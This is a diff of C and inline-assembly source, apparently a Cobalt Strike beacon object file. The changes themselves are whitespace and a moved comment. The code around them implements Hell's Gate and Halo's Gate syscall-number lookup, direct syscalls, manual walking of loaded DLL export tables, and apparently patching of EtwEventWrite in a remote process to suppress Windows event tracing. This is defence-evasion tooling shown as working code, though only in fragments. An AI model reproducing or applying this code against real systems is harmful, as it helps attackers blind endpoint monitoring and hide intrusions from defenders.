@@ -35,6 +35,7 @@ typedef BOOL   (NTAPI  * tNtProtectVirtualMemory)(HANDLE, PVOID, PULONG, ULONG, 
 //   R9:  0000000020000080
 // )
 //typedef HANDLE (WINAPI * tOpenProcess)(DWORD, WINBOOL, DWORD);
+// https://github.com/n00bk1t/n00bk1t/blob/master/ntopenprocess.c
 // Structs for NtOpenProcess
 typedef struct _OBJECT_ATTRIBUTES
 {
@@ -62,8 +63,6 @@ typedef struct _CLIENT_ID
 //   R8:  000000000014FD90 -> 0x30
 //   R9:  000000000014FD80 -> 28A4h (process ID in Hex)
 typedef BOOL (NTAPI * tNtOpenProcess)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
-// https://github.com/n00bk1t/n00bk1t/blob/master/ntopenprocess.c
-
 
 // ASM Function Declaration
 PVOID crawlLdrDllList(wchar_t *);
@@ -95,7 +94,6 @@ typedef struct ntapis{
     DWORD NtOpenProcessSyscall;
     PVOID pEtwEventWrite;
 }ntapis;
-
 
 void go(char * args, int len) {
 	datap parser;
@@ -235,6 +233,7 @@ void go(char * args, int len) {
 	HellsGate(nt.NtProtectVirtualMemorySyscall);
 	HellDescent(hProc, &aligedETW, (PSIZE_T)&memPage, oldprotect, &oldprotect);
 }
+
 __asm__(
 "findSyscallNumber: \n"
 	"xor rsi, rsi \n"
@@ -247,11 +246,13 @@ __asm__(
 	"mov ax, [rcx+4] \n"
 	"ret \n"
 );
+
 __asm__(
 "error: \n"
 	"xor rax, rax \n"
 	"ret \n"
 );
+
 __asm__(
 "halosGateUp: \n"
 	"xor rsi, rsi \n"
@@ -268,6 +269,7 @@ __asm__(
 	"mov ax, [rcx+4] \n"
 	"ret \n"
 );
+
 __asm__(
 "halosGateDown: \n"
 	"xor rsi, rsi \n"
@@ -284,12 +286,14 @@ __asm__(
 	"mov ax, [rcx+4] \n"
 	"ret \n"
 );
+
 __asm__(
 "HellsGate: \n"
 	"xor r11, r11 \n"
 	"mov r11d, ecx \n"
 	"ret \n"
 );
+
 __asm__(
 "HellDescent: \n"
 	"xor rax, rax \n"
@@ -298,6 +302,7 @@ __asm__(
 	"syscall \n"
 	"ret \n"
 );
+
 __asm__(
 "pageAlign: \n"
 	"or cx,0xFFF \n"    // This with +1 will align us to a memory page.
@@ -305,6 +310,7 @@ __asm__(
 	"xchg rax, rcx \n" // return aligned page
 	"ret"
 );
+
 // Takes in the 4 first for characters of a DLL and returns the base address of that DLL module if it is already loaded into memory
 // PVOID crawlLdrDllList(wchar_t * dllName)
 __asm__(
@@ -339,6 +345,7 @@ __asm__(
 "end: \n"
 	"ret \n"
 );
+
 // Takes in the address of a DLL in memory and returns the DLL's Export Directory Address
 //PVOID getExportDirectory(PVOID dllBase)
 __asm__(
@@ -352,6 +359,7 @@ __asm__(
 	"add rax, r8 \n"
 	"ret \n" // return ExportDirectory;
 );
+
 // Return the address of the Export Address Table
 // PVOID getExportAddressTable(PVOID dllBase, PVOID ExportDirectory)
 //                                    RCX              RDX
@@ -363,6 +371,7 @@ __asm__(
 	"add rax, rcx \n"          // RAX = VA ExportAddressTable (The address of the Export table in running memory of the process)
 	"ret \n" // return ExportAddressTable
 );
+
 // Return the address of the Export Name Table
 // PVOID getExportNameTable(PVOID dllBase, PVOID ExportDirectory)
 //                                 RCX              RDX
@@ -374,6 +383,7 @@ __asm__(
 	"add rax, rcx \n"          // RAX = VA ExportAddressOfNames 
 	"ret \n" // return ExportNameTable;
 );
+
 // Return the address of the Export Ordinal Table
 // PVOID getExportOrdinalTable(PVOID dllBase, PVOID ExportDirectory)
 //                                 RCX              RDX
@@ -385,6 +395,7 @@ __asm__(
 	"add rax, rcx \n"          // RAX = VA ExportAddressOfNameOrdinals 
 	"ret \n" // return ExportOrdinalTable;
 );
+
 // PVOID getSymbolAddress(PVOID symbolString, PVOID symbolStringSize, PVOID dllBase, PVOID ExportAddressTable, PVOID ExportNameTable, PVOID ExportOrdinalTable)
 __asm__(
 "getSymbolAddress: \n"
